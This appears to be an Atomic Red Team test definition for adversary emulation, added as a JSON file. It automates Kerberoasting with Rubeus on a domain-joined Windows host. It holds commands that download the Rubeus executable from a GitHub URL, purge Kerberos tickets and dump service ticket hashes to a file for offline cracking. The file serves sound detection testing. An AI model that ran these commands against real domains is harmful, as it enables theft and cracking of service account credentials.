@@ -1,0 +1,182 @@
+{
+  "id": "14625569-6def-4497-99ac-8e7817105b55",
+  "name": "Rubeus kerberoast",
+  "description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "fda8a128-fa81-4359-a12c-c073ee233eeb",
+      "type": "execute-command",
+      "data": {
+        "command": "klist purge\ncmd.exe /c \"#{local_folder}\\#{local_executable}\" kerberoast #{flags} /outfile:\"#{local_folder}\\#{out_file}\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a0a0a8ea-790a-46d3-ae21-a3749d0875ae",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item \"#{local_folder}\\#{out_file}\" -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ffc86ad2-684c-4142-a0bc-111cc8dcf02c",
+      "name": "Check dependency 1/2",
+      "description": "Computer must be domain joined\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0ca23d5b-f570-4622-bff0-2e603102bbec",
+      "name": "Resolve dependency 1/2",
+      "description": "Computer must be domain joined\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host Joining this computer to a domain must be done manually\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "7c4090f4-8677-4d51-a884-f3fd1b002b5d",
+      "name": "Re-check dependency 1/2",
+      "description": "Computer must be domain joined\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "e146290c-64ab-4321-aaac-6de438f5c149",
+      "name": "Check dependency 2/2",
+      "description": "Rubeus must exist\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if(Test-Path -Path \"#{local_folder}\\#{local_executable}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "02b3817a-7acb-4f44-acb1-bed53c6065dd",
+      "name": "Resolve dependency 2/2",
+      "description": "Rubeus must exist\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-Webrequest -Uri #{rubeus_url} -OutFile \"#{local_folder}\\#{local_executable}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "dbdac311-51a7-4150-be35-0956ff59d57d",
+      "name": "Re-check dependency 2/2",
+      "description": "Rubeus must exist\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if(Test-Path -Path \"#{local_folder}\\#{local_executable}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "fda8a128-fa81-4359-a12c-c073ee233eeb",
+      "p": "on-success",
+      "o": "a0a0a8ea-790a-46d3-ae21-a3749d0875ae"
+    },
+    {
+      "s": "fda8a128-fa81-4359-a12c-c073ee233eeb",
+      "p": "on-failure",
+      "o": "a0a0a8ea-790a-46d3-ae21-a3749d0875ae"
+    },
+    {
+      "s": "ffc86ad2-684c-4142-a0bc-111cc8dcf02c",
+      "p": "on-success",
+      "o": "fda8a128-fa81-4359-a12c-c073ee233eeb"
+    },
+    {
+      "s": "ffc86ad2-684c-4142-a0bc-111cc8dcf02c",
+      "p": "on-failure",
+      "o": "0ca23d5b-f570-4622-bff0-2e603102bbec"
+    },
+    {
+      "s": "0ca23d5b-f570-4622-bff0-2e603102bbec",
+      "p": "on-success",
+      "o": "7c4090f4-8677-4d51-a884-f3fd1b002b5d"
+    },
+    {
+      "s": "7c4090f4-8677-4d51-a884-f3fd1b002b5d",
+      "p": "on-failure",
+      "o": "fda8a128-fa81-4359-a12c-c073ee233eeb"
+    },
+    {
+      "s": "e146290c-64ab-4321-aaac-6de438f5c149",
+      "p": "on-success",
+      "o": "fda8a128-fa81-4359-a12c-c073ee233eeb"
+    },
+    {
+      "s": "e146290c-64ab-4321-aaac-6de438f5c149",
+      "p": "on-failure",
+      "o": "02b3817a-7acb-4f44-acb1-bed53c6065dd"
+    },
+    {
+      "s": "02b3817a-7acb-4f44-acb1-bed53c6065dd",
+      "p": "on-success",
+      "o": "dbdac311-51a7-4150-be35-0956ff59d57d"
+    },
+    {
+      "s": "dbdac311-51a7-4150-be35-0956ff59d57d",
+      "p": "on-failure",
+      "o": "fda8a128-fa81-4359-a12c-c073ee233eeb"
+    }
+  ],
+  "tags": [
+    "T1558.003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "rubeus_url",
+      "type": "url",
+      "description": "URL of Rubeus executable",
+      "value": "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe"
+    },
+    {
+      "name": "flags",
+      "type": "string",
+      "description": "command flags you would like to run (optional and blank by default)",
+      "value": ""
+    },
+    {
+      "name": "local_folder",
+      "type": "path",
+      "description": "Local path of Rubeus executable",
+      "value": "PathToAtomicsFolder\\..\\ExternalPayloads"
+    },
+    {
+      "name": "local_executable",
+      "type": "string",
+      "description": "name of the rubeus executable",
+      "value": "rubeus.exe"
+    },
+    {
+      "name": "out_file",
+      "type": "string",
+      "description": "file where command results are stored",
+      "value": "rubeus_output.txt"
+    }
+  ]
+}
